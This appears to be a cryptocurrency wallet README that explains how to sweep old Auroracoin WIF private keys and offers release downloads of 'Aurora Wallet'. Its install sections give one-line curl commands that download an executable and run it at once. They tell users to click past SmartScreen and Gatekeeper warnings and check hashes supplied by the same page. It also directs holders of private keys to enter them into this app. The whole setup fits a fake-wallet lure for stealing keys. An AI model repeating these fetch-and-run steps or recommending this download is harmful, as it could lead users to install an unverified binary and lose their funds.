![Aurora Wallet import private key WIF guide](assets/aurora-wallet-guide-article-banner.png)

# How to import and sweep Auroracoin private keys in WIF

Single keys from the early years, and the safe way to move their balance into a modern wallet.

## Downloads - 2026.08.1.0

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |


A WIF key is a Base58 string starting with 5, K or L, and the safe way to use one is to sweep it rather than keep it.

Holders from the 2014 era often have individual keys rather than a wallet file: one key per address, exported from an old client or printed on paper. Each key still controls its address, and each one can be moved into the wallet you run today.

<!-- ARTICLE-BODY-BEGIN -->

## Sweep rather than import

A sweep spends the whole balance to an address your wallet controls, which retires the key. An import keeps the key in use at its original address, which leaves the exposure in place.

Sweeping is the better choice for a single key because the old string may have passed through a screenshot, an email or a printout. Once the balance is at a phrase-backed address, the exposed key holds nothing.

## Sweep in order

1. Confirm the key's address and balance on a public explorer.
2. Open the sweep field in Aurora Wallet and enter the key.
3. Check that the wallet resolves the address printed beside the key.
4. Approve the sweep transaction and wait for one confirmation.
5. Confirm the balance appears at your phrase-backed address.
6. Destroy the paper or file copy of the key.

One key at a time keeps a mistake contained. If a key fails validation, <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/24-error-5-invalid-encoding.md">error 5 and invalid encoding</a> lists the character confusions that cause it.

## Multiple keys and old formats

A wallet holding several keys can sweep them in one session, with one transaction per key and one fee per transaction. Check each confirmation before moving to the next, so a failed sweep is obvious rather than buried.

Keys exported from the original client may be compressed or uncompressed. Both import, and both resolve to their own address, so compare the resolved address with the printed one before you approve anything.

The sweep is signed locally and broadcast by the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">current Aurora Wallet release</a>, which never transmits the key itself.

If a key turns out to belong to a whole wallet rather than a single address, the file path in <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/22-import-wallet-dat.md">importing a wallet.dat</a> is the shorter route.

## FAQ

### Do I need the old client to sweep a key?

No. The key is enough, and the modern wallet signs the sweep itself.

### Should I keep the key after sweeping?

Keep it until the sweep confirms and the balance is visible, then destroy every copy. A swept key with an empty balance is only a liability.

<!-- ARTICLE-BODY-END -->

## How to install Aurora Wallet

### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.

```cmd
certutil -hashfile setup.exe SHA256
```

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.

```bash
shasum -a 256 setup.dmg
```

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
2. Extract the archive.
3. Run `aurora-wallet`.

Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.

```bash
sha256sum app.zip
```


## Related guides

- [Sweep a paper wallet](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/23-sweep-paper-wallet.md)
- [Error 5 invalid encoding](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/24-error-5-invalid-encoding.md)
- [Import a wallet.dat](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/22-import-wallet-dat.md)
- [Receiving addresses and QR codes](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/31-receiving-addresses-qr.md)
